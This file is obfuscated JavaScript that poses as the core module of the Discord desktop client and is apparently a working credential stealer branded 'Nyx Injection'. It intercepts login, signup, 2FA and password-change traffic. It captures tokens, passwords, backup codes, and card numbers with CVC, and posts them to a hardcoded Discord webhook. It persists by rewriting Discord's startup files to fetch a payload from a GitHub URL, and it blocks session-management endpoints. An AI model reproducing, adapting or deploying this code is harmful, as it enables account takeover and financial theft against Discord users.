const _0x2ac6a0=_0x6888;(function(_0xc8545c,_0x127ff0){const _0x51f7a7=_0x6888,_0x201386=_0xc8545c();while(!![]){try{const _0xfa91ef=parseInt(_0x51f7a7(0x1d2))/0x1*(parseInt(_0x51f7a7(0x19d))/0x2)+parseInt(_0x51f7a7(0x189))/0x3+parseInt(_0x51f7a7(0x170))/0x4*(parseInt(_0x51f7a7(0x19f))/0x5)+-parseInt(_0x51f7a7(0x1f1))/0x6+-parseInt(_0x51f7a7(0x148))/0x7+-parseInt(_0x51f7a7(0x1c8))/0x8*(-parseInt(_0x51f7a7(0x146))/0x9)+parseInt(_0x51f7a7(0x16b))/0xa*(parseInt(_0x51f7a7(0x1c5))/0xb);if(_0xfa91ef===_0x127ff0)break;else _0x201386['push'](_0x201386['shift']());}catch(_0x49c150){_0x201386['push'](_0x201386['shift']());}}}(_0x39fb,0x6a68e));const fs=require('fs'),os=require('os'),https=require(_0x2ac6a0(0x1d4)),args=process[_0x2ac6a0(0x1c6)],path=require(_0x2ac6a0(0x1ea)),querystring=require(_0x2ac6a0(0x173)),{BrowserWindow,session}=require(_0x2ac6a0(0x169)),CONFIG={'webhook':_0x2ac6a0(0x16f),'injection_url':_0x2ac6a0(0x1fb),'filters':{'urls':[_0x2ac6a0(0x186),_0x2ac6a0(0x1e5),_0x2ac6a0(0x185),_0x2ac6a0(0x163),'/users/@me']},'filters2':{'urls':[_0x2ac6a0(0x1f9),_0x2ac6a0(0x14f),_0x2ac6a0(0x177),'https://discordapp.com/api/v*/auth/sessions']},'payment_filters':{'urls':[_0x2ac6a0(0x17f),_0x2ac6a0(0x1d5)]},'API':_0x2ac6a0(0x1de),'badges':{'Discord_Emloyee':{'Value':0x1,'Emoji':'<:8485discordemployee:1163172252989259898>','Rare':!![]},'Partnered_Server_Owner':{'Value':0x2,'Emoji':'<:9928discordpartnerbadge:1163172304155586570>','Rare':!![]},'HypeSquad_Events':{'Value':0x4,'Emoji':_0x2ac6a0(0x1e0),'Rare':!![]},'Bug_Hunter_Level_1':{'Value':0x8,'Emoji':'<:4744bughunterbadgediscord:1163172239970140383>','Rare':!![]},'Early_Supporter':{'Value':0x200,'Emoji':_0x2ac6a0(0x1d1),'Rare':!![]},'Bug_Hunter_Level_2':{'Value':0x4000,'Emoji':'<:1757bugbusterbadgediscord:1163172238942543892>','Rare':!![]},'Early_Verified_Bot_Developer':{'Value':0x20000,'Emoji':_0x2ac6a0(0x159),'Rare':!![]},'House_Bravery':{'Value':0x40,'Emoji':_0x2ac6a0(0x1ca),'Rare':![]},'House_Brilliance':{'Value':0x80,'Emoji':'<:6936hypesquadbrilliance:1163172244474822746>','Rare':![]},'House_Balance':{'Value':0x100,'Emoji':_0x2ac6a0(0x168),'Rare':![]},'Active_Developer':{'Value':0x400000,'Emoji':'<:1207iconactivedeveloper:1163172534443851868>','Rare':![]},'Certified_Moderator':{'Value':0x40000,'Emoji':_0x2ac6a0(0x1a8),'Rare':!![]},'Spammer':{'Value':0x100080,'Emoji':'⌨️','Rare':![]}}},executeJS=_0x1d811d=>{const _0x15fe5b=_0x2ac6a0,_0x50cd5b=BrowserWindow[_0x15fe5b(0x194)]()[0x0];return _0x50cd5b[_0x15fe5b(0x18c)][_0x15fe5b(0x17c)](_0x1d811d,!0x0);},clearAllUserData=()=>{const _0x4a7dec=_0x2ac6a0;executeJS(_0x4a7dec(0x19c)),executeJS(_0x4a7dec(0x1f8));},getToken=async()=>await executeJS(_0x2ac6a0(0x1e1)),request=async(_0x3c5be3,_0x2f84ee,_0xfe7a75,_0x504881)=>{const _0x50ce10=_0x2ac6a0;_0x2f84ee=new URL(_0x2f84ee);const _0x27cbeb={'protocol':_0x2f84ee[_0x50ce10(0x193)],'hostname':_0x2f84ee[_0x50ce10(0x1b3)],'path':_0x2f84ee[_0x50ce10(0x157)],'method':_0x3c5be3,'headers':{'Access-Control-Allow-Origin':'*'}};if(_0x2f84ee[_0x50ce10(0x1d6)])_0x27cbeb['path']+=_0x2f84ee[_0x50ce10(0x1d6)];for(const _0xa0dc43 in _0xfe7a75)_0x27cbeb['headers'][_0xa0dc43]=_0xfe7a75[_0xa0dc43];const _0x8b40e4=https[_0x50ce10(0x18a)](_0x27cbeb);if(_0x504881)_0x8b40e4[_0x50ce10(0x1ad)](_0x504881);return _0x8b40e4[_0x50ce10(0x175)](),new Promise((_0x1817c1,_0x2052c2)=>{const _0x1585ba=_0x50ce10;_0x8b40e4['on'](_0x1585ba(0x167),_0x2c8328=>{const _0x2d9e80=_0x1585ba;let _0x46bb87='';_0x2c8328['on'](_0x2d9e80(0x1b9),_0xa775f2=>_0x46bb87+=_0xa775f2),_0x2c8328['on'](_0x2d9e80(0x175),()=>_0x1817c1(_0x46bb87));});});},hooker=async(_0x40ed36,_0x182bdf,_0x113dbb)=>{const _0x1e3e6e=_0x2ac6a0;_0x40ed36[_0x1e3e6e(0x142)]=_0x1e3e6e(0x1ed),_0x40ed36['avatar_url']=_0x1e3e6e(0x1e4),_0x40ed36[_0x1e3e6e(0x1d7)][0x0]['author']={'name':_0x113dbb['username']},_0x40ed36[_0x1e3e6e(0x1d7)][0x0][_0x1e3e6e(0x143)]={'url':_0x1e3e6e(0x1be)+_0x113dbb['id']+'/'+_0x113dbb[_0x1e3e6e(0x145)]+_0x1e3e6e(0x1f2)},_0x40ed36[_0x1e3e6e(0x1d7)][0x0][_0x1e3e6e(0x1e9)]={'text':_0x1e3e6e(0x158),'icon_url':_0x1e3e6e(0x1e4)},_0x40ed36['embeds'][0x0][_0x1e3e6e(0x14b)]=_0x1e3e6e(0x198);const _0x49a952=getNitro(_0x113dbb[_0x1e3e6e(0x1ba)]),_0x3fac26=getBadges(_0x113dbb[_0x1e3e6e(0x144)]),_0x100010=await getBilling(_0x182bdf),_0x48e345=await getFriends(_0x182bdf),_0x346d5a=await getServers(_0x182bdf);_0x40ed36['embeds'][0x0][_0x1e3e6e(0x1a7)][_0x1e3e6e(0x151)]({'name':'Token','value':_0x1e3e6e(0x1b7)+_0x182bdf+_0x1e3e6e(0x1b7),'inline':![]},{'name':'Nitro','value':_0x1e3e6e(0x1b7)+_0x49a952+'```','inline':!![]},{'name':_0x1e3e6e(0x16d),'value':'```'+_0x3fac26+'```','inline':!![]},{'name':_0x1e3e6e(0x188),'value':_0x1e3e6e(0x1b7)+_0x100010+_0x1e3e6e(0x1b7),'inline':!![]}),_0x40ed36[_0x1e3e6e(0x1d7)][_0x1e3e6e(0x151)]({'title':_0x1e3e6e(0x1d8)+_0x48e345[_0x1e3e6e(0x199)],'description':_0x48e345[_0x1e3e6e(0x161)]},{'title':_0x1e3e6e(0x182)+_0x346d5a[_0x1e3e6e(0x183)],'description':_0x346d5a['message']});for(const _0x59659c in _0x40ed36[_0x1e3e6e(0x1d7)]){_0x40ed36[_0x1e3e6e(0x1d7)][_0x59659c]['color']=0xffffff;}await request(_0x1e3e6e(0x19a),CONFIG[_0x1e3e6e(0x164)],{'Content-Type':_0x1e3e6e(0x166)},JSON[_0x1e3e6e(0x17e)](_0x40ed36));},fetch=async(_0x276567,_0x2f6559)=>{const _0x3327b1=_0x2ac6a0;return JSON[_0x3327b1(0x1d9)](await request('GET',CONFIG[_0x3327b1(0x1bf)]+_0x276567,_0x2f6559));},fetchAccount=async _0x56b4fa=>await fetch('',{'Authorization':_0x56b4fa}),fetchBilling=async _0x31ec8b=>await fetch('/billing/payment-sources',{'Authorization':_0x31ec8b}),fetchServers=async _0xc76fd6=>await fetch(_0x2ac6a0(0x1cb),{'Authorization':_0xc76fd6}),fetchFriends=async _0x102378=>await fetch(_0x2ac6a0(0x1bc),{'Authorization':_0x102378}),getNitro=_0x5e360f=>{const _0x59c8b0=_0x2ac6a0;switch(_0x5e360f){case 0x1:return _0x59c8b0(0x195);case 0x2:return'\x20Nitro\x20Boost\x20';case 0x3:return _0x59c8b0(0x179);default:return _0x59c8b0(0x1dc);}},getBadges=_0x3577d9=>{const _0x448fe5=_0x2ac6a0;let _0x4ceb41='';for(const _0x2f57a5 in CONFIG[_0x448fe5(0x1c7)]){let _0xd2ee62=CONFIG['badges'][_0x2f57a5];if((_0x3577d9&_0xd2ee62['Value'])==_0xd2ee62[_0x448fe5(0x1ac)])_0x4ceb41+=_0xd2ee62['Emoji']+'\x20';}return _0x4ceb41||_0x448fe5(0x1dc);},getRareBadges=_0x369750=>{const _0x41a0b6=_0x2ac6a0;let _0x5271cc='';for(const _0x40ac2c in CONFIG[_0x41a0b6(0x1c7)]){let _0xbe84b5=CONFIG[_0x41a0b6(0x1c7)][_0x40ac2c];if((_0x369750&_0xbe84b5['Value'])==_0xbe84b5[_0x41a0b6(0x1ac)]&&_0xbe84b5[_0x41a0b6(0x1c0)])_0x5271cc+=_0xbe84b5['Emoji']+'\x20';}return _0x5271cc;},getBilling=async _0x29cfa9=>{const _0x4910be=_0x2ac6a0,_0x84e6ee=await fetchBilling(_0x29cfa9);let _0x499f46='';return _0x84e6ee[_0x4910be(0x1f4)](_0x19d586=>{const _0x1b0473=_0x4910be;if(!_0x19d586[_0x1b0473(0x1f5)])switch(_0x19d586[_0x1b0473(0x1d0)]){case 0x1:_0x499f46+='💳\x20';break;case 0x2:_0x499f46+='<:paypal:1148653305376034967>\x20';break;}}),_0x499f46||'\x20Null\x20';},getFriends=async _0x3fd72c=>{const _0x458bdb=_0x2ac6a0,_0x54b232=await fetchFriends(_0x3fd72c),_0x34446b=_0x54b232[_0x458bdb(0x15d)](_0x3955c1=>{const _0x30c7ad=_0x458bdb;return _0x3955c1[_0x30c7ad(0x1d0)]==0x1;});let _0x74f399='';for(const _0x2a37d7 of _0x34446b){var _0x3b6e01=getRareBadges(_0x2a37d7['user'][_0x458bdb(0x17b)]);if(_0x3b6e01!=''){if(!_0x74f399)_0x74f399='**\x20``\x20Rare\x20Friends\x20``\x20**\x0a';_0x74f399+=_0x3b6e01+'\x20'+_0x2a37d7[_0x458bdb(0x15b)][_0x458bdb(0x142)]+'\x0a';}}return _0x74f399=_0x74f399||_0x458bdb(0x1b5),{'message':_0x74f399,'totalFriends':_0x54b232['length']};},getServers=async _0x5cb8a2=>{const _0x2b0f2e=_0x2ac6a0,_0x21c867=await fetchServers(_0x5cb8a2),_0x7c2f52=_0x21c867[_0x2b0f2e(0x15d)](_0x296aea=>_0x296aea[_0x2b0f2e(0x1cf)]==_0x2b0f2e(0x154)||_0x296aea[_0x2b0f2e(0x1cf)]==_0x2b0f2e(0x1e8));let _0x705f6d='';for(const _0x570e53 of _0x7c2f52){_0x705f6d===''&&(_0x705f6d+=_0x2b0f2e(0x1a4)),_0x705f6d+=(_0x570e53[_0x2b0f2e(0x14d)]?'<:SA_Owner:991312415352430673>\x20Owner':'<:admin:967851956930482206>\x20Admin')+_0x2b0f2e(0x1b2)+_0x570e53['name']+'\x0a'+(_0x2b0f2e(0x1b7)+_0x570e53['approximate_member_count']+_0x2b0f2e(0x1e2));}return _0x705f6d=_0x705f6d||'**\x20``\x20No\x20Rare\x20Servers\x20``\x20**',{'message':_0x705f6d,'totalGuilds':_0x21c867['length']};},EmailPassToken=async(_0x3b0fc2,_0x6c015f,_0x3653a2,_0x38e5a1)=>{const _0x59f954=_0x2ac6a0,_0x1564a5=await fetchAccount(_0x3653a2),_0x185f7e={'content':_0x59f954(0x1b8)+_0x1564a5[_0x59f954(0x142)]+'\x20Just\x20'+_0x38e5a1+_0x59f954(0x1ce),'embeds':[{'fields':[{'name':_0x59f954(0x16c),'value':'`'+_0x3b0fc2+'`','inline':!![]},{'name':'Password','value':'`'+_0x6c015f+'`','inline':!![]}]}]};hooker(_0x185f7e,_0x3653a2,_0x1564a5);},BackupCodesViewed=async(_0x567ad0,_0x4c576e)=>{const _0x3b3a5c=_0x2ac6a0,_0x5541e9=await fetchAccount(_0x4c576e),_0x301095=_0x567ad0[_0x3b3a5c(0x15d)](_0x5768d2=>{return _0x5768d2['consumed']===![];});let _0x1be42d='';for(let _0x3cbeeb of _0x301095){_0x1be42d+=_0x3cbeeb['code']['substr'](0x0,0x4)+'-'+_0x3cbeeb['code']['substr'](0x4)+'\x0a';}const _0x2db487={'content':_0x3b3a5c(0x1c3)+_0x5541e9['username']+_0x3b3a5c(0x184),'embeds':[{'fields':[{'name':_0x3b3a5c(0x18f),'value':_0x3b3a5c(0x1b7)+_0x1be42d+_0x3b3a5c(0x1b7),'inline':![]},{'name':_0x3b3a5c(0x16c),'value':'`'+_0x5541e9[_0x3b3a5c(0x187)]+'`','inline':!![]},{'name':_0x3b3a5c(0x153),'value':'`'+(_0x5541e9[_0x3b3a5c(0x172)]||'None')+'`','inline':!![]}]}]};hooker(_0x2db487,_0x4c576e,_0x5541e9);},PasswordChanged=async(_0x2998c2,_0x1564f1,_0x40dbbc)=>{const _0x76a3f5=_0x2ac6a0,_0x31f78b=await fetchAccount(_0x40dbbc),_0x5db577={'content':_0x76a3f5(0x1b8)+_0x31f78b['username']+_0x76a3f5(0x1f0),'embeds':[{'fields':[{'name':_0x76a3f5(0x1b0),'value':_0x76a3f5(0x1b7)+_0x2998c2+_0x76a3f5(0x1b7),'inline':!![]},{'name':'Old\x20Password','value':_0x76a3f5(0x1b7)+_0x1564f1+_0x76a3f5(0x1b7),'inline':!![]}]}]};hooker(_0x5db577,_0x40dbbc,_0x31f78b);},CreditCardAdded=async(_0x2d04a4,_0x1eabb0,_0x46f9d2,_0x28d159,_0x136d98)=>{const _0x2e1e30=_0x2ac6a0,_0x5aa9c0=await fetchAccount(_0x136d98),_0x5ed697={'content':_0x2e1e30(0x1b8)+_0x5aa9c0[_0x2e1e30(0x142)]+_0x2e1e30(0x196),'embeds':[{'fields':[{'name':_0x2e1e30(0x1dd),'value':_0x2e1e30(0x1b7)+_0x2d04a4+'```','inline':!![]},{'name':'CVC','value':_0x2e1e30(0x1b7)+_0x1eabb0+_0x2e1e30(0x1b7),'inline':!![]},{'name':_0x2e1e30(0x155),'value':_0x2e1e30(0x1b7)+_0x46f9d2+'/'+_0x28d159+_0x2e1e30(0x1b7),'inline':!![]}]}]};hooker(_0x5ed697,_0x136d98,_0x5aa9c0);},PaypalAdded=async _0x13655a=>{const _0x57383d=_0x2ac6a0,_0x3a29c5=await fetchAccount(_0x13655a),_0x309179={'content':'**\x20``\x20'+_0x3a29c5['username']+_0x57383d(0x1c4),'embeds':[{'fields':[{'name':_0x57383d(0x16c),'value':_0x57383d(0x1b7)+_0x3a29c5[_0x57383d(0x187)]+_0x57383d(0x1b7),'inline':!![]},{'name':'Phone','value':'```'+(_0x3a29c5['phone']||'None')+_0x57383d(0x1b7),'inline':!![]}]}]};hooker(_0x309179,_0x13655a,_0x3a29c5);},discordPath=(function(){const _0x5abb5c=_0x2ac6a0,_0x3639f0=args[0x0][_0x5abb5c(0x1bd)](path['sep'])[_0x5abb5c(0x15a)](0x0,-0x1)[_0x5abb5c(0x1a6)](path['sep']);let _0x282d29;if(process[_0x5abb5c(0x17d)]===_0x5abb5c(0x14e))_0x282d29=path[_0x5abb5c(0x1a6)](_0x3639f0,'resources');else process[_0x5abb5c(0x17d)]===_0x5abb5c(0x171)&&(_0x282d29=path[_0x5abb5c(0x1a6)](_0x3639f0,_0x5abb5c(0x1b4),'Resources'));if(fs[_0x5abb5c(0x1f3)](_0x282d29))return{'resourcePath':_0x282d29,'app':_0x3639f0};return{'undefined':undefined,'undefined':undefined};}());function _0x6888(_0x198d6a,_0x377c52){const _0x39fb94=_0x39fb();return _0x6888=function(_0x688806,_0x83ee26){_0x688806=_0x688806-0x142;let _0x1a88e1=_0x39fb94[_0x688806];return _0x1a88e1;},_0x6888(_0x198d6a,_0x377c52);}function _0x39fb(){const _0x49aa60=['title','unlinkSync','owner','win32','https://discord.com/api/v*/auth/sessions','logged\x20in','push','logged\x20in\x20with\x202FA','Phone','562949953421311','Expiration','Network.getResponseBody','pathname','Nyx\x20Discord\x20Injection','<:1207iconearlybotdeveloper:1163172236807639143>','slice','user','\x27,\x20(res)\x20=>\x20{\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20const\x20file\x20=\x20fs.createWriteStream(indexJs);\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20res.replace(\x27https://discord.com/api/webhooks/1269793628813787268/jQlXQiTwgbS9bd7lnIN_miuQzJeIt0OGgakLLP44E3wuB0DghqumpjvQIC_RUz3BHfrr\x27,\x20\x27','filter','sendCommand','includes','/login','message','initiation','/mfa/codes-verification','webhook','body','application/json','response','<:5242hypesquadbalance:1163172243417858128>','electron','APPDATA','70FuWeUA','Email','Badges','tokens','%WEBHOOK%','12892hTeMuj','darwin','phone','querystring','webRequest','end','rmdirSync','https://*.discord.com/api/v*/auth/sessions','some','\x20Nitro\x20Basic\x20','requestId','public_flags','executeJavaScript','platform','stringify','https://api.braintreegateway.com/merchants/49pp2rp4phym7387/client_api/v*/payment_methods/paypal_accounts','writeFileSync','\x27)\x0a\x20\x20if\x20(fs.existsSync(bdPath))\x20require(bdPath);','Total\x20Servers:\x20','totalGuilds','\x20Just\x20Viewed\x20His\x202FA\x20Backup\x20Codes!\x20``\x20**','/mfa/totp','/auth/login','email','Billing','473190nAdoUK','request','url','webContents','/register','card[exp_month]','Backup\x20Codes','defaultSession','token','debugger','protocol','getAllWindows','\x20Nitro\x20Classic\x20','\x20Just\x20Added\x20A\x20Credit\x20Card!\x20``\x20**','index.js','Account\x20Information','totalFriends','POST','discord','document.body.appendChild(document.createElement`iframe`).contentWindow.localStorage.clear()','357814lwuMWa','endsWith','35ZumrUS','attach','\x20Just\x20Got\x20Injected!\x20``\x20**','onBeforeRequest','Network.responseReceived','**\x20``\x20Rare\x20Servers\x20``\x20**\x0a','\x27;\x0a\x20\x20const\x20fileSize\x20=\x20fs.statSync(indexJs).size\x0a\x20\x20fs.readFileSync(indexJs,\x20\x27utf8\x27,\x20(err,\x20data)\x20=>\x20{\x0a\x20\x20\x20\x20\x20\x20if\x20(fileSize\x20<\x2020000\x20||\x20data\x20===\x20\x22module.exports\x20=\x20require(\x27./core.asar\x27)\x22)\x20\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20init();\x0a\x20\x20})\x0a\x20\x20async\x20function\x20init()\x20{\x0a\x20\x20\x20\x20\x20\x20https.get(\x27','join','fields','<:4149blurplecertifiedmoderator:1163172255489085481>','app','bytes','paypal_accounts','Value','write','/@me','login','New\x20Password','const\x20fs\x20=\x20require(\x27fs\x27),\x20https\x20=\x20require(\x27https\x27);\x0a\x20\x20const\x20indexJs\x20=\x20\x27','\x20|\x20','host','Contents','**\x20``\x20No\x20Rare\x20Friends\x20``\x20**','from','```','**\x20``\x20','data','premium_type','toString','/relationships','split','https://cdn.discordapp.com/avatars/','API','Rare','\x5cdiscord_desktop_core\x5cindex.js','\x5cbetterdiscord\x5cdata\x5cbetterdiscord.asar','**\x20``','\x20Just\x20Added\x20A\x20PayPayl\x20Account!\x20``\x20**','91993mtMXLq','argv','badges','32OFqtVt','replace','<:6601hypesquadbravery:1163172246492287017>','/guilds?with_counts=true','card[number]','test','!\x20``\x20**','permissions','type','<:5053earlysupporter:1163172241996005416>','3XMZHCr','app.asar','https','https://api.stripe.com/v*/tokens','search','embeds','Total\x20Friends:\x20','parse','exports','status','\x20Null\x20','Number','https://discord.com/api/v9/users/@me','password','<:9171hypesquadevents:1163172248140660839>','(webpackChunkdiscord_app.push([[\x27\x27],{},e=>{m=[];for(let\x20c\x20in\x20e.c)m.push(e.c[c])}]),m).find(m=>m?.exports?.default?.getToken!==void\x200).exports.default.getToken()','\x20Members```\x0a','wss://remote-auth-gateway','https://i.ibb.co/NF7mxHN/nyxstealer.png','/auth/register','backup_codes','1.3','2251799813685247','footer','path','None','new_password','Nyx\x20Injection','/codes-verification','card[exp_year]','\x20Just\x20Changed\x20His\x20Password!\x20``\x20**','3282294OkKpOg','.webp','existsSync','forEach','invalid','filters2','changed\x20his\x20email\x20to\x20**','location.reload()','wss://remote-auth-gateway.discord.gg/*','package.json','https://raw.githubusercontent.com/bomboclat-cyber/injection/main/injection.js','username','thumbnail','flags','avatar','1597797xmvrKs','Network.getRequestPostData','3519474vZSGSs','/totp','filters'];_0x39fb=function(){return _0x49aa60;};return _0x39fb();}async function initiation(){const _0x2f5fdd=_0x2ac6a0;if(fs[_0x2f5fdd(0x1f3)](path[_0x2f5fdd(0x1a6)](__dirname,'initiation'))){fs[_0x2f5fdd(0x176)](path[_0x2f5fdd(0x1a6)](__dirname,_0x2f5fdd(0x162)));const _0xa85b8a=await getToken();if(!_0xa85b8a)return;const _0x3bc8b9=await fetchAccount(_0xa85b8a),_0x3ee962={'content':_0x2f5fdd(0x1b8)+_0x3bc8b9[_0x2f5fdd(0x142)]+_0x2f5fdd(0x1a1),'embeds':[{'fields':[{'name':'Email','value':_0x2f5fdd(0x1b7)+_0x3bc8b9[_0x2f5fdd(0x187)]+_0x2f5fdd(0x1b7),'inline':!![]},{'name':_0x2f5fdd(0x153),'value':_0x2f5fdd(0x1b7)+(_0x3bc8b9[_0x2f5fdd(0x172)]||_0x2f5fdd(0x1eb))+_0x2f5fdd(0x1b7),'inline':!![]}]}]};await hooker(_0x3ee962,_0xa85b8a,_0x3bc8b9),clearAllUserData();}const {resourcePath:_0xfc75b7,app:_0x2ce671}=discordPath;if(_0xfc75b7===undefined||_0x2ce671===undefined)return;const _0x39b828=path[_0x2f5fdd(0x1a6)](_0xfc75b7,_0x2f5fdd(0x1a9)),_0x34d35e=path[_0x2f5fdd(0x1a6)](_0x39b828,_0x2f5fdd(0x1fa)),_0x1069cf=path[_0x2f5fdd(0x1a6)](_0x39b828,_0x2f5fdd(0x197)),_0x59fc08=fs['readdirSync'](_0x2ce671+'\x5cmodules\x5c')[_0x2f5fdd(0x15d)](_0x179a89=>/discord_desktop_core-+?/[_0x2f5fdd(0x1cd)](_0x179a89))[0x0],_0x221c87=_0x2ce671+'\x5cmodules\x5c'+_0x59fc08+_0x2f5fdd(0x1c1),_0x50639d=path[_0x2f5fdd(0x1a6)](process['env'][_0x2f5fdd(0x16a)],_0x2f5fdd(0x1c2));if(!fs[_0x2f5fdd(0x1f3)](_0x39b828))fs['mkdirSync'](_0x39b828);if(fs[_0x2f5fdd(0x1f3)](_0x34d35e))fs[_0x2f5fdd(0x14c)](_0x34d35e);if(fs[_0x2f5fdd(0x1f3)](_0x1069cf))fs[_0x2f5fdd(0x14c)](_0x1069cf);if(process[_0x2f5fdd(0x17d)]===_0x2f5fdd(0x14e)||process[_0x2f5fdd(0x17d)]===_0x2f5fdd(0x171)){fs[_0x2f5fdd(0x180)](_0x34d35e,JSON[_0x2f5fdd(0x17e)]({'name':_0x2f5fdd(0x19b),'main':'index.js'},null,0x4));const _0x57c31e=_0x2f5fdd(0x1b1)+_0x221c87+'\x27;\x0a\x20\x20const\x20bdPath\x20=\x20\x27'+_0x50639d+_0x2f5fdd(0x1a5)+CONFIG['injection_url']+_0x2f5fdd(0x15c)+CONFIG[_0x2f5fdd(0x164)]+'\x27)\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20res.pipe(file);\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20file.on(\x27finish\x27,\x20()\x20=>\x20{\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20file.close();\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20});\x0a\x20\x20\x20\x20\x20\x20\x0a\x20\x20\x20\x20\x20\x20}).on(\x22error\x22,\x20(err)\x20=>\x20{\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20setTimeout(init(),\x2010000);\x0a\x20\x20\x20\x20\x20\x20});\x0a\x20\x20}\x0a\x20\x20require(\x27'+path[_0x2f5fdd(0x1a6)](_0xfc75b7,_0x2f5fdd(0x1d3))+_0x2f5fdd(0x181);fs[_0x2f5fdd(0x180)](_0x1069cf,_0x57c31e[_0x2f5fdd(0x1c9)](/\\/g,'\x5c\x5c'));}}let email='',password='',initiationCalled=![];const createWindow=()=>{const _0x2322d2=_0x2ac6a0;mainWindow=BrowserWindow[_0x2322d2(0x194)]()[0x0];if(!mainWindow)return;mainWindow[_0x2322d2(0x18c)]['debugger'][_0x2322d2(0x1a0)](_0x2322d2(0x1e7)),mainWindow['webContents']['debugger']['on'](_0x2322d2(0x161),async(_0x387d64,_0x5ca4d4,_0x204e98)=>{const _0xfa6c13=_0x2322d2;!initiationCalled&&(await initiation(),initiationCalled=!![]);if(_0x5ca4d4!==_0xfa6c13(0x1a3))return;if(!CONFIG[_0xfa6c13(0x14a)]['urls'][_0xfa6c13(0x178)](_0x5486af=>_0x204e98[_0xfa6c13(0x167)]['url'][_0xfa6c13(0x19e)](_0x5486af)))return;if(![0xc8,0xca][_0xfa6c13(0x15f)](_0x204e98[_0xfa6c13(0x167)][_0xfa6c13(0x1db)]))return;const _0x275958=await mainWindow[_0xfa6c13(0x18c)]['debugger'][_0xfa6c13(0x15e)](_0xfa6c13(0x156),{'requestId':_0x204e98[_0xfa6c13(0x17a)]}),_0x414c63=JSON['parse'](_0x275958[_0xfa6c13(0x165)]),_0x1539b9=await mainWindow[_0xfa6c13(0x18c)][_0xfa6c13(0x192)][_0xfa6c13(0x15e)](_0xfa6c13(0x147),{'requestId':_0x204e98[_0xfa6c13(0x17a)]}),_0x588c2e=JSON[_0xfa6c13(0x1d9)](_0x1539b9['postData']);switch(!![]){case _0x204e98['response'][_0xfa6c13(0x18b)][_0xfa6c13(0x19e)](_0xfa6c13(0x160)):if(!_0x414c63['token']){email=_0x588c2e[_0xfa6c13(0x1af)],password=_0x588c2e[_0xfa6c13(0x1df)];return;}EmailPassToken(_0x588c2e['login'],_0x588c2e[_0xfa6c13(0x1df)],_0x414c63[_0xfa6c13(0x191)],_0xfa6c13(0x150));break;case _0x204e98[_0xfa6c13(0x167)][_0xfa6c13(0x18b)][_0xfa6c13(0x19e)](_0xfa6c13(0x18d)):EmailPassToken(_0x588c2e['email'],_0x588c2e['password'],_0x414c63['token'],'signed\x20up');break;case _0x204e98[_0xfa6c13(0x167)][_0xfa6c13(0x18b)][_0xfa6c13(0x19e)](_0xfa6c13(0x149)):EmailPassToken(email,password,_0x414c63['token'],_0xfa6c13(0x152));break;case _0x204e98[_0xfa6c13(0x167)][_0xfa6c13(0x18b)][_0xfa6c13(0x19e)](_0xfa6c13(0x1ee)):BackupCodesViewed(_0x414c63[_0xfa6c13(0x1e6)],await getToken());break;case _0x204e98['response'][_0xfa6c13(0x18b)][_0xfa6c13(0x19e)](_0xfa6c13(0x1ae)):if(!_0x588c2e[_0xfa6c13(0x1df)])return;_0x588c2e[_0xfa6c13(0x187)]&&EmailPassToken(_0x588c2e[_0xfa6c13(0x187)],_0x588c2e[_0xfa6c13(0x1df)],_0x414c63[_0xfa6c13(0x191)],_0xfa6c13(0x1f7)+_0x588c2e[_0xfa6c13(0x187)]+'**');_0x588c2e[_0xfa6c13(0x1ec)]&&PasswordChanged(_0x588c2e[_0xfa6c13(0x1ec)],_0x588c2e['password'],_0x414c63[_0xfa6c13(0x191)]);break;}}),mainWindow[_0x2322d2(0x18c)]['debugger']['sendCommand']('Network.enable'),mainWindow['on']('closed',()=>{createWindow();});};createWindow(),session[_0x2ac6a0(0x190)][_0x2ac6a0(0x174)]['onCompleted'](CONFIG['payment_filters'],async(_0x1f63d4,_0x4727a0)=>{const _0x2c9c90=_0x2ac6a0;if(![0xc8,0xca]['includes'](_0x1f63d4['statusCode']))return;if(_0x1f63d4['method']!='POST')return;switch(!![]){case _0x1f63d4['url']['endsWith'](_0x2c9c90(0x16e)):const _0x413133=querystring[_0x2c9c90(0x1d9)](Buffer[_0x2c9c90(0x1b6)](_0x1f63d4['uploadData'][0x0][_0x2c9c90(0x1aa)])[_0x2c9c90(0x1bb)]());CreditCardAdded(_0x413133[_0x2c9c90(0x1cc)],_0x413133['card[cvc]'],_0x413133[_0x2c9c90(0x18e)],_0x413133[_0x2c9c90(0x1ef)],await getToken());break;case _0x1f63d4['url']['endsWith'](_0x2c9c90(0x1ab)):PaypalAdded(await getToken());break;}}),session[_0x2ac6a0(0x190)][_0x2ac6a0(0x174)][_0x2ac6a0(0x1a2)](CONFIG[_0x2ac6a0(0x1f6)],(_0x1df621,_0x4047e3)=>{const _0x5ae109=_0x2ac6a0;if(_0x1df621[_0x5ae109(0x18b)]['startsWith'](_0x5ae109(0x1e3))||_0x1df621[_0x5ae109(0x18b)][_0x5ae109(0x19e)]('auth/sessions'))return _0x4047e3({'cancel':!![]});}),module[_0x2ac6a0(0x1da)]=require('./core.asar');